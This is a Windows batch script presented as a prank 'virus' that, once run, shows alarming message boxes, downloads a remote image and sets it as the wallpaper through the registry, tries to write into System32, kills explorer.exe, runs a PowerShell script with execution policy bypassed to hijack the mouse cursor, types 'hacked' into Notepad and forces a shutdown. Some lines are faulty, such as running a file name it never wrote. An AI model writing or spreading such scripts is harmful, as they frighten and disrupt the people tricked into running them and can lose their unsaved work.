@echo off
echo X=MsgBox("This virus is only for windows 10,0+16,"BEN.EXE") >> troll.vbs
run trolled.vbs
timeout 10
set "url=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRauJnhyvlRKvK5kd-MxQFcYYR57KxbW_elxzImWMOJSzKOrhXQO3QCVUY&s=10"
set "img=%temp%\web_wallpaper.jpg"

powershell -command "(New-Object Net.WebClient).DownloadFile('%url%', '%img%')"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
echo X=MsgBox("I see you,0+16,"BEN.EXE") >> hacked.vbs
start hacked.vbs
start https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/6d5b1537-df04-4ffe-aad6-86bf81f0b50a/dfa8lu3-af78e118-5d73-4a56-ae1b-12c841b1138f.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiIvZi82ZDViMTUzNy1kZjA0LTRmZmUtYWFkNi04NmJmODFmMGI1MGEvZGZhOGx1My1hZjc4ZTExOC01ZDczLTRhNTYtYWUxYi0xMmM4NDFiMTEzOGYuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.xbF-1FlQb5Yz6QFwgmv7TzNFTK7JKUsxWx8IfUifY70
echo IDK >> "C:\Windows\System32\config\OSDATA.txt"
taskkill /f /im explorer.exe
echo $sig = @' > rungloanxa.ps1
echo using System; >> rungloanxa.ps1
echo using System.Runtime.InteropServices; >> rungloanxa.ps1
echo public class M { >> rungloanxa.ps1
echo [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y); >> rungloanxa.ps1
echo [DllImport("user32.dll")] public static extern bool GetCursorPos(out POINT lpPoint); >> rungloanxa.ps1
echo public struct POINT { public int X; public int Y; } >> rungloanxa.ps1
echo } >> rungloanxa.ps1
echo '@ >> rungloanxa.ps1
echo Add-Type $sig >> rungloanxa.ps1
echo $rand = New-Object Random >> rungloanxa.ps1
echo for ($i=0; $i -lt 300; $i++) { >> rungloanxa.ps1
echo   $x = $rand.Next(0,1920) >> rungloanxa.ps1
echo   $y = $rand.Next(0,1080) >> rungloanxa.ps1
echo   [M]::SetCursorPos($x,$y) >> rungloanxa.ps1
echo   Start-Sleep -Milliseconds 40 >> rungloanxa.ps1
echo } >> rungloanxa.ps1
powershell -ExecutionPolicy Bypass -File rungloanxa.ps1
echo X=MsgBox("You should not download that,0+16,"BEN.EXE") >> hacked.vbs
echo Set WshShell = WScript.CreateObject("WScript.Shell") > type.vbs
echo WshShell.Run "notepad" >> type.vbs
echo WScript.Sleep 100 >> type.vbs
echo WshShell.SendKeys "h" >> type.vbs
echo WScript.Sleep 100 >> type.vbs
echo WshShell.SendKeys "a" >> type.vbs
echo WScript.Sleep 100 >> type.vbs
echo WshShell.SendKeys "c" >> type.vbs
echo WScript.Sleep 100 >> type.vbs
echo WshShell.SendKeys "k" >> type.vbs
echo WScript.Sleep 100 >> type.vbs
echo WshShell.SendKeys "e" >> type.vbs
echo WScript.Sleep 100 >> type.vbs
echo WshShell.SendKeys "d" >> type.vbs
start type.vbs
timeout 10
shutdown -c "YOU SHOULD NOT DONE THAT" -s
pause

